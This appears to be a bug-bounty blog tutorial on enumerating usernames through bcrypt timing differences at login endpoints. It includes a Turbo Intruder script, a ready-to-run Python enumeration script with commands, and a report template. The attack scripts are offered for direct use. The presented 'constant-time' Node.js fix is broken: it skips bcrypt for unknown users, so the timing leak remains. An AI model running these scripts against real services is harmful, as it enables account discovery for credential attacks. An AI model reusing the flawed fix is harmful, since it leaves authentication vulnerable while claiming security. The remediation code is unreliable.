# Username Enumeration via Timing Attacks

> **Severity:** CRITICAL  
> **OWASP:** A07 Identification & Authentication Failures  
> **CWE:** CWE-208 – Observable Timing Discrepancy  
> **Bug Bounty Payouts:** $500 – $5,000+ (often triaged higher than response enum)

---

## What Is It?

This one is sneaky. There's *no visible difference* in the response — same status code, same body, same byte count. But the *clock doesn't lie*.

**Timing enumeration** exploits the fact that authentication logic takes measurably longer for valid usernames than invalid ones. The reason: password hashing.

**The analogy:** A bank vault either has your account or it doesn't. If it does, the clerk goes and retrieves your file (takes 300ms). If it doesn't, they immediately say "no file found" (takes 5ms). Even if both responses look identical, you can tell which happened by measuring *how long it took*.

---

## The Root Cause: bcrypt

Modern apps hash passwords with bcrypt, argon2, or scrypt. These are **intentionally slow** — that's the point (makes brute force hard). But that slowness is also a timing side-channel.

```
VALID USERNAME flow:
  1. Receive username + password
  2. DB lookup: username found -> retrieve hash
  3. bcrypt.compare(password, hash)  <- 100-350ms
  4. Return response

INVALID USERNAME flow:
  1. Receive username + password
  2. DB lookup: username NOT found
  3. Return "invalid credentials"    <- 5-15ms (skip bcrypt)
```

**Delta: ~300ms per request.** Tiny to a human, enormous to an attacker with a script.

---

## When Is It Exploitable?

Not all timing differences are exploitable. You need:

| Condition | Required? |
|---|---|
| Server uses bcrypt/argon2/scrypt (cost factor 8+) | Yes |
| No network jitter normalization | Yes (usually absent) |
| Consistent single-connection measurement | Yes |
| Rate limiting > 50 req/min | Helps (more samples) |
| Identical response body for all failures | Yes (otherwise use Article 1) |

---

## Attack Methodology

### Step 1 — Confirm There's No Visible Signal

If there's already a body/status difference, you don't need timing. Timing enum matters when the app *looks* hardened — generic error messages, uniform status codes.

Manually test: same status? Same body? Same length? → Proceed to timing.

### Step 2 — Baseline Timing (Manual in Burp Repeater)

Send 20 requests each for:
- A username you know exists (your own account or reported in scope docs)
- A clearly fake username (`zz_does_not_exist_aa`)

Record response times. If median valid > median invalid by 100ms+, it's exploitable.

### Step 3 — Install Turbo Intruder

Turbo Intruder is a Burp Suite extension built for high-precision timing attacks. It uses HTTP pipelining and concurrent connections to reduce network noise.

**Install:** Burp Suite → Extensions → BApp Store → Turbo Intruder

### Step 4 — Turbo Intruder Script

Load your login request in Burp, right-click → "Send to Turbo Intruder". Use this script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,      # single conn = consistent baseline
        requestsPerConnection=100,
        pipeline=False                # no pipelining (clean timing)
    )
    
    # Queue each username from wordlist
    for user in open('/usr/share/seclists/Usernames/top-usernames-shortlist.txt'):
        engine.queue(target.req, user.rstrip())

def handleResponse(req, interesting):
    # Flag anything that took > 100ms
    if req.status == 200 or req.time > 100:
        table.add(req)
```

**Request template in Turbo Intruder:**
```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "%s", "password": "wrongpass_x!8"}
```

### Step 5 — Analyze Results

Sort the results table by **Response Time** (descending). Any username with P95 time > 150ms above baseline is a valid user candidate. Confirm manually.

---

## Automation Script (Standalone)

```python
#!/usr/bin/env python3
"""
Username Enum via Timing — Statistical Analyzer
Uses P95 latency with multiple samples for accurate detection.
"""

import requests
import time
import statistics
import argparse
from concurrent.futures import ThreadPoolExecutor

SAMPLES = 5       # requests per username for averaging
THRESHOLD = 0.08  # 80ms above baseline = flag (adjust per target)

def measure_latency(username, target, session, n=SAMPLES):
    """Measure median response time over n requests."""
    times = []
    for _ in range(n):
        start = time.perf_counter()
        try:
            session.post(
                target,
                json={"username": username.strip(), "password": "Test!wrongpass99"},
                timeout=15,
                allow_redirects=False
            )
        except:
            pass
        times.append(time.perf_counter() - start)
    return statistics.median(times)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--users",  required=True)
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-T", "--threads", type=int, default=1)  # keep low!
    args = parser.parse_args()

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    # Establish baseline with obviously fake username
    print("[*] Measuring baseline timing...")
    baseline = measure_latency("zz_invalid_does_not_exist_99", args.target, session, n=10)
    print(f"[*] Baseline median: {baseline*1000:.1f}ms")
    print(f"[*] Flag threshold:  {(baseline + THRESHOLD)*1000:.1f}ms (+{THRESHOLD*1000:.0f}ms)\n")

    usernames = [u.strip() for u in open(args.users).readlines() if u.strip()]
    print(f"[*] Testing {len(usernames)} usernames (single-threaded for timing accuracy)...")
    print("-" * 60)

    found = []
    for username in usernames:
        t = measure_latency(username, args.target, session)
        delta = t - baseline
        marker = " [!!] VALID?" if delta > THRESHOLD else ""
        print(f"  {username:<30} {t*1000:>7.1f}ms  (delta: {delta*1000:+.1f}ms){marker}")
        if delta > THRESHOLD:
            found.append((username, t*1000, delta*1000))

    print("\n" + "="*60)
    print(f"[+] Potential valid users ({len(found)} found):")
    for u, t, d in sorted(found, key=lambda x: -x[2]):
        print(f"  [!] {u:<30}  time={t:.1f}ms  delta={d:+.1f}ms")

if __name__ == "__main__":
    main()
```

**Run (always single-threaded for timing accuracy):**
```bash
python3 enum_timing.py \
  -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -t https://target.com/api/login
```

---

## Understanding the Numbers

| Response Time | Interpretation |
|---|---|
| < 15ms | Invalid user, DB miss, no hash computed |
| 15 – 80ms | Network jitter / borderline (re-test) |
| 80 – 200ms | Possible valid user (lower bcrypt cost) |
| 200 – 400ms | Valid user with bcrypt cost 10 (default) |
| 400ms+ | Valid user, high-cost hash or argon2 |

**Pro tip:** Always measure from a machine with low/stable network latency to the target. VPS on the same region as the target massively reduces noise. Test from `curl` + a fast VPS before Burp.

---

## Why This Is Often CRITICAL

Response-based enum is annoying. Timing-based enum that bypasses generic error message mitigations? That's a bypass of a security control — automatically escalates severity.

Bug hunters who report: *"I found user enum despite your generic error messages because of timing"* get much higher bounties than the basic response-diff report.

---

## Severity Rating Guide

| Context | Severity |
|---|---|
| Bypasses generic error message hardening | **Critical** |
| SSO / Identity provider | **Critical** |
| Healthcare / fintech platform | **Critical** |
| Standard SaaS with rate limiting | **High** |
| Rate-limited < 10 req/min (hard to measure) | **Medium** |
| Requires privileged network position | **Low** |

---

## Bug Report Template

```
Title: Username Enumeration via Timing Side-Channel at /api/login

Severity: Critical

Summary:
The /api/login endpoint is vulnerable to username enumeration via 
timing discrepancy. Despite returning identical response bodies and 
status codes for all authentication failures, valid usernames cause 
a measurably longer response time (~300ms) due to bcrypt computation, 
while invalid usernames return in ~10ms (no hash computed).

This attack bypasses the generic error message mitigation and allows 
reliable user enumeration at scale.

Steps to Reproduce:
1. Send POST /api/login {"username":"valid_user","password":"wrong"}
   Median response time: 318ms

2. Send POST /api/login {"username":"zz_invalid","password":"wrong"}
   Median response time: 9ms

3. Delta = 309ms — confirms user "valid_user" EXISTS on the platform.
   Repeated over 20 samples, P95 delta consistently > 280ms.

4. See attached Turbo Intruder results table (CSV).

Tools: Burp Suite Turbo Intruder, custom Python script.

Impact:
An attacker can enumerate all valid usernames on the platform despite 
hardened error messages. Combined with credential stuffing or password 
spraying, this enables targeted account takeover at scale.

Remediation:
1. Compute a dummy bcrypt hash for invalid usernames (constant-time):
   if user not found: bcrypt.compare(password, DUMMY_HASH)
   
2. Alternatively: pre-check user existence, always compute hash.

3. Add random delay (100-500ms jitter) to all auth responses.

4. Deploy rate limiting with exponential backoff.

CVSS 3.1: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N — Score: 5.9 (Medium)
(Escalate to High/Critical based on platform sensitivity)
```

---

## Constant-Time Fix (Code Reference)

For Node.js (the most common offender):

```javascript
// BAD - timing leak
const user = await db.findUser(username);
if (!user) return res.status(401).json({ error: "Invalid credentials" });
const valid = await bcrypt.compare(password, user.hash);

// GOOD - constant time
const DUMMY_HASH = "$2b$10$dummyhashplaceholdervalue1234567890abcdefgh";
const user = await db.findUser(username);
const hash = user ? user.hash : DUMMY_HASH;  // always compute
const valid = user ? await bcrypt.compare(password, hash) : false;
return res.status(401).json({ error: "Invalid credentials" });
```

---

## Key Takeaway

**The best-defended app in the world still has a clock.**

Generic error messages are table stakes. A timing-aware hunter breaks through them by measuring microseconds. When you see `Incorrect username or password` with no other signals — don't give up. Fire up Turbo Intruder, let it run 50 samples per user, sort by time. The server already told you everything you need to know.

---

*#300DaysWithAppSec | Day 18 | Username Enumeration via Timing*

---

**Connect:**  
- LinkedIn: [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369)  
- GitHub: [github.com/anand87794](https://github.com/anand87794)  
- Portfolio: [anandprajapati.lovable.app](https://anandprajapati.lovable.app)  
- X: [@anand87794](https://x.com/anand87794)  

@anand87794
